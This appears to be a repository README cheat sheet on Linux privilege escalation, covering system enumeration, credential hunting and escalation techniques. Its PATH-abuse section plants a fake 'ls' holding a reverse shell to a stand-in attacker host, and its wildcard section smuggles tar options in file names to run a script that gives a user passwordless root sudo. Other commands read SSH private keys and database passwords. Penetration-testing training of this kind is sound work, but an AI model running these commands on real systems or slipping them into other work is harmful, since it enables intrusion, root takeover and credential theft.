# Linux Privilege Escalation 🚀

This repository contains various Linux privilege escalation techniques, including environment enumeration, service enumeration, credential hunting, path abuse, and wildcard abuse.

---

## 📌 Table of Contents
- [1️⃣ Environment Enumeration](#environment-enumeration)
- [2️⃣ Linux Services & Internals Enumeration](#linux-services--internals-enumeration)
- [3️⃣ Credential Hunting](#credential-hunting)
- [4️⃣ Path Abuse](#path-abuse)
- [5️⃣ Wildcard Abuse](#wildcard-abuse)

---

## 1️⃣ Environment Enumeration 🔍

### OS & Kernel Information:
```bash
cat /etc/os-release          # OS version
cat /proc/version            # Kernel version
uname -a                     # Complete system info
lscpu                        # CPU info
```

### Security Mechanisms:
```bash
# Check for security features
sestatus                     # SELinux status
aa-status                    # AppArmor status
iptables -L                  # Firewall rules
ufw status                   # Uncomplicated Firewall
fail2ban-client status       # Fail2ban status
```

### Drives, Shares & Printers:
```bash
lsblk                         # List block devices
lpstat -a                     # Printer information
```

---

## 2️⃣ Linux Services & Internals Enumeration ⚙️

### Running Processes:
```bash
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```

### Installed Packages:
```bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

### GTFOBins Exploitable Binaries:
```bash
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d'); do 
    if grep -q "$i" installed_pkgs.list; then 
        echo "Check GTFO for: $i"; 
    fi; 
done
```

### Find All Shell Scripts:
```bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

---

## 3️⃣ Credential Hunting 🔑

### Find Configuration Files:
```bash
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

### Extract Database Credentials:
```bash
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```

### Check SSH Keys:
```bash
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/known_hosts
```

---

## 4️⃣ Path Abuse 🛠️

Modifying a user's `PATH` allows execution of malicious binaries instead of legitimate system commands.

```bash
export PATH=.:$PATH    # Add the current directory to PATH
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' > ls
chmod +x ls
ls    # Executes our malicious 'ls' instead of /bin/ls
```

---

## 5️⃣ Wildcard Abuse ⚠️

### **Using `tar` for Privilege Escalation**
If a cron job is executing a command like:
```bash
*/01 * * * * cd /home/user && tar -zcf /home/user/backup.tar.gz *
```
We can exploit wildcards:
```bash
echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```
After the cron job runs, escalate privileges:
```bash
sudo -l    # Verify privilege escalation
sudo su    # Gain root access
```

---

## 📚 References
- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [HackTheBox](https://account.hackthebox.com/login)
---

## ⚠️ Disclaimer
This repository is for **educational purposes only**. Unauthorized testing or exploitation of systems without explicit permission is **illegal**.

---
